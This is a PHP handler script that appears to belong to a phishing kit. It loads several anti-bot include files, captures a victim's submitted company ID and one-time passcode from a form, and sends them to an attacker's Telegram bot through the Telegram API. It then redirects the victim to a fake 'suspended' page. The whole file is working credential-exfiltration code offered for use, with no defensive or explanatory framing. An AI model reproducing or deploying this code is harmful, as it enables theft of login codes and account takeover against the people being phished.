<?php
session_start();
error_reporting(0);
include('../bots/anti1.php');
include('../bots/anti2.php');
include('../bots/anti3.php');
include('../bots/anti4.php');
include('../bots/anti5.php');
include('../bots/anti6.php');
include('../bots/anti7.php');
include('../bots/anti8.php');
include('../bots/ant1.php');
include('../bots/ant2.php');
include('../bots/ant3.php');
include('../bots/ant4.php');
include('../bots/ant5.php');
include('../bots/ant6.php');
include('../bots/ant7.php');
include('../bots/ant8.php');
include 'autob/bt.php';
include "autob/bts2.php";
include "req/config.php";
include('../email.php');
$user = $_POST['username'];
		
	///////////////////////// MAIL PART //////////////////////
		
		$comp  = $_POST['companyid']?$_POST['companyid']:'';
        $user        = $_POST['username'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|--===-======-=======-- OTP --=======-======-===--|

Company Id       : $comp
OTP         : $user 
";
 

		
$website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$Info_LOG,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  
header("location:suspended.php?id=myaccount&y=".md5(rand(100, 999999999))."");
?>